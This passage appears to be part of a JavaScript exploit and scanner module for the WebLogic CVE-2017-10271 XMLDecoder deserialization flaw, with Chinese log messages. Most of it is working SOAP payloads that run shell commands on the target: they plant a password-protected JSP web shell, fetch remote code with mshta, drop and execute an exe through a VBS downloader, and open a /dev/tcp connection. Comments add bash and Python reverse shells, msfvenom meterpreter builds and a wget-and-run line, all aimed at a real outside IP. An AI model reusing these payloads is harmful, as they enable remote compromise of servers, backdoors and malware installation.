GUgKGlzLmhhc01vcmVFbGVtZW50cygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEluZXRBZGRyZXNzIGkgPSBpcy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICB9CgogICAgICAgICAgICAvL1ByaW50V3JpdGVyIG8gPSByZXNwb25zZS5nZXRXcml0ZXIoKTsgIAogICAgICAgICAgICBvdXQucHJpbnQoIjwhLS0gR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyAtLT4iKTsgCiAgICAgICAgfQogICAgICAgIC8vLy8vLy8vLy8vLy8vKi8KICAgIH0vLyBpbiBqc3AKICAgIGVsc2UKICAgIHsKICAgICAgICB0cnkgewogICAgICAgIFN0cmluZyBzeklwID0gIiI7CiAgICAgICAgICAgIFNldDxJbmV0QWRkcmVzcz4gYWRkcnMgPSBuZXcgSGFzaFNldDxJbmV0QWRkcmVzcz4oKTsKICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgbnMgPSBOZXR3b3JrSW50ZXJmYWNlLmdldE5ldHdvcmtJbnRlcmZhY2VzKCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAvLyBpZ25vcmVkLi4uCiAgICAgICAgICAgIH0KICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBOZXR3b3JrSW50ZXJmYWNlIG4gPSBucy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoaXMuaGFzTW9yZUVsZW1lbnRzKCkpIHsKICAgICAgICAgICAgICAgICAgICBJbmV0QWRkcmVzcyBpID0gaXMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIC8vIGlnbm9yZWQuLi4KICAgICAgICB9CgogICAgICAgIC8vUHJpbnRXcml0ZXIgbyA9IHJlc3BvbnNlLmdldFdyaXRlcigpOyAgCiAgICAgICAgb3V0LnByaW50KCI8IS0tIEdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZScgLS0+Iik7IAogICAgfQolPg=='|base64 -d>/tmp/2188029.socks]]></string>
              </void>
            </array>
          <void method="start"/></void>
          <string id="innerValue">
            xx
          </string>
          <string id="response">
    A simpler way to get a value :)    &lt;br/&gt;
    with "<object idref="runOut"/>"   &lt;br/&gt;
    and "<object idref="innerValue"/>  &lt;br/&gt;
  </string>
  <object class="org.restlet.Response" method="getCurrent"> 
    <void method ="setEntity">
      <object idref = "response"/>
      <object class = "org.restlet.data.MediaType" field="TEXT_HTML"></object>
    </void>
  </object>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/})
,s3_1 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[find / -name "417.jsp"|xargs -I {} cp -f /tmp/2188029.socks {}]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s4 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA[mshta http://hk-7.tk/1.jpg]]></string>
                <!--
                <string><![CDATA['del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs']]></string>
                -->
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s5 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <void class = "java.io.FileOutputStream">
          <object class = "java.io.File">
            <string>/dev/tcp/23.105.209.65/777</string>
          </object>
        </void>
    </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

*/}),s6 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <java version="1.4.0" class="java.beans.XMLDecoder">
          <object class="java.io.PrintWriter">
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
            <void method="println">
              <string><![CDATA[<%if("secfree".equals(request.getParameter("password"))){  
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream();  
        int a = -1;  
        byte[] b = new byte[2048];  
        out.print("<pre>");  
        while((a=in.read(b))!=-1){  
            out.println(new String(b));  
        }  
        out.print("</pre>");  
    }%>]]></string>
            </void>
            <void method="close"/>
          </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/></soapenv:Envelope>

*/});
// 
// bash -i >& /dev/tcp/23.105.209.65/9999 0>&1
// python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=12345 LHOST=23.105.209.65 -f elf  -o ./linuxRvsTcp123.elf
// msfvenom -a x86 --platform linux -p  payload/linux/x86/shell/reverse_tcp LPORT=1234 LHOST=23.105.209.65  -e x86/shikata_ga_nai -b '\x00' -i 8 -f elf -o linuxRvsTcp123.elf
// x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &

		var nNum = new Date().getTime()/1000,nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
		s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s3o;
    var hst = _s.parseUrl(url);
    // console.log(s);

    // console.log(hst);
    for(var i = 0; i < aPath.length; i++)
    {
      url = szOld.substr(0, szOld.indexOf('/',13)) + aPath[i];// '/wls-wsat/CoordinatorPortType'
      // console.log(url);
      var oOpt = _s.fnOptHeader({
        method: 'POST',
        uri: url,
        body:s
          ,headers:
          {
            "Host":hst.host,
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Accept-Encoding":"zh-CN,zh",
            "content-type":"text/xml;charset=UTF-8"
          }});
      oOpt.timeout = nTime + 5000;
  		_s.request(oOpt
  		  , function (error, response, body)
  		  {
          _s.error(error);
          body = body || String(error);
  		  	if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
  		  	{
  		  		_s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));

  		  		return;
  		  	}
  		  	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
  		  	// console.log(String(body));
  		  	// console.log([nT,nT2]);

          // console.log(response.headers);
          // console.log(body);
  		  	
  	  		if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
  	  		{
  	  			var r = {vul:true,"body":String(body),href:response.request.uri.href,"url":szOld,"send":s,"des":
  	  				"发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
  	  				statusCode:(response && response.statusCode||0)};
              // X-Powered-By,Set-Cookie,Date
              // X-Pad: avoid browser bug
  	  			// console.log(r);
  	  			fnCbk(r,_t);
  	  		}
  	  		else _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));
  	  		//console.log(body);
  		   }
  		 );
    }
	}
};